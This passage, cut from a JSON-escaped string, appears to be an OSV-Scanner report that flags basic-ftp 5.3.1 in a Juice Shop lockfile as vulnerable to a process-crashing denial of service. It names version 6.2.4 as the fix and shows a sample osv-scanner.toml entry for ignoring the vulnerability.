None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/user/felipe/speckit/juice-shop-master/package-lock.json | basic-ftp | 5.3.1 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5pm8-86m8-9m6r | basic-ftp | 6.2.4 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/user/felipe/speckit/juice-shop-master/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-126345\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
